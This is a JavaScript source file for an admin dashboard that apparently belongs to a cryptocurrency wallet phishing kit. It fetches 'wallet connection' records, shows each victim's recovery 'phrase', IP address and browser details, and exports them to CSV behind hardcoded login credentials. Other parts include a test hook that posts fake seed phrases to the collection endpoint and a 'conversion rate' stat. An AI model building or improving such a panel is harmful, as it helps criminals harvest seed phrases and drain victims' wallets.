
document.addEventListener('DOMContentLoaded', function() {
  // DOM Elements
  const navLinks = document.querySelectorAll('.nav-menu a[data-section]');
  const sections = document.querySelectorAll('.content-section');
  const loginModal = document.getElementById('login-modal');
  const loginBtn = document.getElementById('login-btn');
  const loginUsername = document.getElementById('login-username');
  const loginPassword = document.getElementById('login-password');
  const loginError = document.getElementById('login-error');
  const logoutBtn = document.getElementById('logout-btn');
  const refreshDashboardBtn = document.getElementById('refresh-dashboard');
  const refreshActivitiesBtn = document.getElementById('refresh-activities');
  const exportActivitiesBtn = document.getElementById('export-activities');
  const lastUpdated = document.getElementById('last-updated');
  const totalConnections = document.getElementById('total-connections');
  const todayConnections = document.getElementById('today-connections');
  const uniqueWallets = document.getElementById('unique-wallets');
  const conversionRate = document.getElementById('conversion-rate');
  const recentActivityList = document.getElementById('recent-activity-list');
  const activitiesTableBody = document.getElementById('activities-table-body');
  const activitiesEmptyState = document.getElementById('activities-empty-state');
  const walletFilter = document.getElementById('wallet-filter');
  const dateFilter = document.getElementById('date-filter');
  const activityDetailModal = document.getElementById('activity-detail-modal');
  const closeModalBtns = document.querySelectorAll('.close-btn, .close-modal');
  const notificationToast = document.getElementById('notification-toast');
  const toastCloseBtn = document.querySelector('.toast-close');
  
  // Check if logged in
  function checkAuth() {
    const isLoggedIn = localStorage.getItem('isAdminLoggedIn') === 'true';
    if (!isLoggedIn) {
      showLoginModal();
    } else {
      hideLoginModal();
      fetchActivitiesFromServer();
    }
  }
  
  // Show login modal
  function showLoginModal() {
    loginModal.classList.add('active');
  }
  
  // Hide login modal
  function hideLoginModal() {
    loginModal.classList.remove('active');
    loginUsername.value = '';
    loginPassword.value = '';
    loginError.textContent = '';
  }
  
  // Handle login
  function handleLogin() {
    const username = loginUsername.value;
    const password = loginPassword.value;
    
    if (username === 'cblsupport001' && password === 'og001cbl') {
      localStorage.setItem('isAdminLoggedIn', 'true');
      hideLoginModal();
      fetchActivitiesFromServer();
    } else {
      loginError.textContent = 'Invalid username or password';
      loginPassword.value = '';
    }
  }
  
  // Handle logout
  function handleLogout() {
    localStorage.removeItem('isAdminLoggedIn');
    checkAuth();
  }
  
  // Switch sections
  function switchSection(sectionId) {
    // Remove active class from all sections
    sections.forEach(section => section.classList.remove('active'));
    
    // Add active class to target section
    document.getElementById(`${sectionId}-section`).classList.add('active');
    
    // Update active nav link
    navLinks.forEach(link => {
      if (link.getAttribute('data-section') === sectionId) {
        link.parentElement.classList.add('active');
      } else {
        link.parentElement.classList.remove('active');
      }
    });
  }
  
  // Format date
  function formatDate(dateString) {
    const date = new Date(dateString);
    return date.toLocaleDateString('en-US', { 
      month: 'short', 
      day: 'numeric', 
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  }
  
  // Fetch activities from server
  function fetchActivitiesFromServer() {
    fetch('/api/activities')
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        console.log('Fetched activities:', data);
        if (data && data.activities) {
          saveActivities(data.activities);
          updateDashboard();
        } else {
          console.error('Received invalid activities data:', data);
        }
      })
      .catch(error => {
        console.error('Error fetching activities:', error);
        // Fall back to local storage if server fetch fails
        updateDashboard();
      });
  }
  
  // Get activities from localStorage
  function getActivities() {
    const storedActivities = localStorage.getItem('walletActivities');
    return storedActivities ? JSON.parse(storedActivities) : [];
  }
  
  // Save activities to localStorage
  function saveActivities(activities) {
    localStorage.setItem('walletActivities', JSON.stringify(activities));
  }
  
  // Update dashboard stats and recent activities
  function updateDashboard() {
    const activities = getActivities();
    const now = new Date();
    
    // Update last updated time
    lastUpdated.textContent = now.toLocaleString();
    
    // Update stats
    totalConnections.textContent = activities.length;
    
    // Calculate today's connections
    const today = new Date().setHours(0, 0, 0, 0);
    const todayActivities = activities.filter(activity => {
      const activityDate = new Date(activity.timestamp).setHours(0, 0, 0, 0);
      return activityDate === today;
    });
    todayConnections.textContent = todayActivities.length;
    
    // Calculate unique wallets
    const uniqueWalletTypes = [...new Set(activities.map(activity => activity.wallet))];
    uniqueWallets.textContent = uniqueWalletTypes.length;
    
    // Calculate conversion rate (random for demo)
    conversionRate.textContent = `${Math.floor(Math.random() * 15 + 5)}%`;
    
    // Update recent activity list
    updateRecentActivities();
    
    // Update full activities table
    updateActivitiesTable();
  }
  
  // Update recent activities list
  function updateRecentActivities() {
    const activities = getActivities();
    
    if (activities.length === 0) {
      recentActivityList.innerHTML = `
        <div class="empty-state">
          <p>No recent activities</p>
        </div>
      `;
      return;
    }
    
    recentActivityList.innerHTML = '';
    
    // Get the 5 most recent activities
    const recentActivities = activities.slice(0, 5);
    
    recentActivities.forEach(activity => {
      const activityItem = document.createElement('div');
      activityItem.className = 'activity-item';
      activityItem.innerHTML = `
        <div class="activity-details">
          <div class="wallet-icon">${activity.wallet ? activity.wallet.charAt(0).toUpperCase() : 'W'}</div>
          <div class="activity-info">
            <div class="activity-type">${activity.wallet ? activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1) : 'Unknown'} Wallet Connection</div>
            <div class="activity-time">${formatDate(activity.timestamp)}</div>
          </div>
        </div>
        <div class="activity-status">Completed</div>
      `;
      
      recentActivityList.appendChild(activityItem);
    });
  }
  
  // Update activities table
  function updateActivitiesTable() {
    let activities = getActivities();
    
    // Apply filters
    const walletFilterValue = walletFilter.value;
    const dateFilterValue = dateFilter.value;
    
    if (walletFilterValue !== 'all') {
      activities = activities.filter(activity => activity.wallet === walletFilterValue);
    }
    
    if (dateFilterValue !== 'all') {
      const now = new Date();
      const today = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
      
      if (dateFilterValue === 'today') {
        activities = activities.filter(activity => {
          const activityDate = new Date(activity.timestamp).getTime();
          return activityDate >= today;
        });
      } else if (dateFilterValue === 'yesterday') {
        const yesterday = today - 24 * 60 * 60 * 1000;
        activities = activities.filter(activity => {
          const activityDate = new Date(activity.timestamp).getTime();
          return activityDate >= yesterday && activityDate < today;
        });
      } else if (dateFilterValue === 'week') {
        const lastWeek = today - 7 * 24 * 60 * 60 * 1000;
        activities = activities.filter(activity => {
          const activityDate = new Date(activity.timestamp).getTime();
          return activityDate >= lastWeek;
        });
      } else if (dateFilterValue === 'month') {
        const lastMonth = today - 30 * 24 * 60 * 60 * 1000;
        activities = activities.filter(activity => {
          const activityDate = new Date(activity.timestamp).getTime();
          return activityDate >= lastMonth;
        });
      }
    }
    
    // Update table
    activitiesTableBody.innerHTML = '';
    
    if (activities.length === 0) {
      activitiesEmptyState.style.display = 'block';
      return;
    }
    
    activitiesEmptyState.style.display = 'none';
    
    activities.forEach((activity, index) => {
      const tr = document.createElement('tr');
      const walletName = activity.wallet ? activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1) : 'Unknown';
      tr.innerHTML = `
        <td>${index + 1}</td>
        <td>${walletName}</td>
        <td>${formatDate(activity.timestamp)}</td>
        <td>${activity.ip || 'Unknown'}</td>
        <td><span class="activity-status">Completed</span></td>
        <td>
          <button class="action-btn view-details" data-index="${index}">View Details</button>
        </td>
      `;
      
      activitiesTableBody.appendChild(tr);
    });
    
    // Attach event listeners to view details buttons
    document.querySelectorAll('.view-details').forEach(btn => {
      btn.addEventListener('click', function() {
        const index = this.getAttribute('data-index');
        showActivityDetails(activities[index]);
      });
    });
  }
  
  // Show activity details in modal
  function showActivityDetails(activity) {
    const walletName = activity.wallet ? activity.wallet.charAt(0).toUpperCase() + activity.wallet.slice(1) : 'Unknown';
    document.getElementById('detail-wallet').textContent = walletName;
    document.getElementById('detail-phrase').textContent = activity.phrase || 'Not available';
    document.getElementById('detail-timestamp').textContent = formatDate(activity.timestamp);
    document.getElementById('detail-ip').textContent = activity.ip || 'Unknown';
    document.getElementById('detail-useragent').textContent = activity.userAgent || 'Not available';
    
    activityDetailModal.classList.add('active');
  }
  
  // Show notification toast
  function showNotification(title, message) {
    const toastTitle = document.querySelector('.toast-title');
    const toastMessage = document.querySelector('.toast-message');
    
    toastTitle.textContent = title;
    toastMessage.textContent = message;
    
    notificationToast.classList.add('active');
    
    setTimeout(() => {
      notificationToast.classList.remove('active');
    }, 5000);
  }
  
  // Check for new activities from server
  function checkForNewActivities() {
    fetch('/api/activities')
      .then(response => response.json())
      .then(data => {
        if (data && data.activities) {
          const currentActivities = getActivities();
          
          // Compare counts
          if (data.activities.length > currentActivities.length) {
            const newCount = data.activities.length - currentActivities.length;
            showNotification('New Activity', `${newCount} new wallet connection(s) detected`);
            saveActivities(data.activities);
            updateDashboard();
            return newCount;
          }
        }
        return 0;
      })
      .catch(error => {
        console.error('Error checking for new activities:', error);
        return 0;
      });
  }
  
  // Event listeners
  loginBtn.addEventListener('click', handleLogin);
  logoutBtn.addEventListener('click', handleLogout);
  
  navLinks.forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const sectionId = this.getAttribute('data-section');
      switchSection(sectionId);
    });
  });
  
  refreshDashboardBtn.addEventListener('click', function() {
    fetchActivitiesFromServer();
  });
  
  refreshActivitiesBtn.addEventListener('click', function() {
    fetchActivitiesFromServer();
  });
  
  walletFilter.addEventListener('change', updateActivitiesTable);
  dateFilter.addEventListener('change', updateActivitiesTable);
  
  exportActivitiesBtn.addEventListener('click', function() {
    const activities = getActivities();
    if (activities.length === 0) {
      alert('No activities to export');
      return;
    }
    
    // Create CSV content
    let csvContent = 'data:text/csv;charset=utf-8,';
    csvContent += 'ID,Wallet,Date,IP,Phrase\n';
    
    activities.forEach((activity, index) => {
      const row = [
        index + 1,
        activity.wallet || 'Unknown',
        formatDate(activity.timestamp),
        activity.ip || 'Unknown',
        activity.phrase || 'Not available'
      ].join(',');
      
      csvContent += row + '\n';
    });
    
    // Create download link
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', 'wallet_activities.csv');
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  });
  
  closeModalBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      activityDetailModal.classList.remove('active');
    });
  });
  
  document.getElementById('delete-activity').addEventListener('click', function() {
    const wallet = document.getElementById('detail-wallet').textContent;
    const phrase = document.getElementById('detail-phrase').textContent;
    
    const activities = getActivities();
    const filteredActivities = activities.filter(activity => {
      return !(activity.wallet === wallet.toLowerCase() && activity.phrase === phrase);
    });
    
    saveActivities(filteredActivities);
    updateDashboard();
    activityDetailModal.classList.remove('active');
    showNotification('Success', 'Activity record deleted successfully');
  });
  
  toastCloseBtn.addEventListener('click', function() {
    notificationToast.classList.remove('active');
  });
  
  // Check for new data every 30 seconds
  setInterval(function() {
    checkForNewActivities();
  }, 30000);
  
  // Initialize
  checkAuth();
  switchSection('dashboard');
  
  // For testing
  window.testAddActivity = function(wallet, phrase) {
    const newActivity = {
      wallet: wallet || 'metamask',
      phrase: phrase || 'test test test test test test test test test test test test',
      timestamp: new Date().toISOString(),
      ip: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      userAgent: navigator.userAgent
    };
    
    fetch('/api/connect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(newActivity),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Test activity added:', data);
      fetchActivitiesFromServer();
      showNotification('New Connection', `New ${newActivity.wallet} wallet connected`);
    })
    .catch(error => {
      console.error('Error adding test activity:', error);
    });
    
    return 'Activity request sent';
  };
});
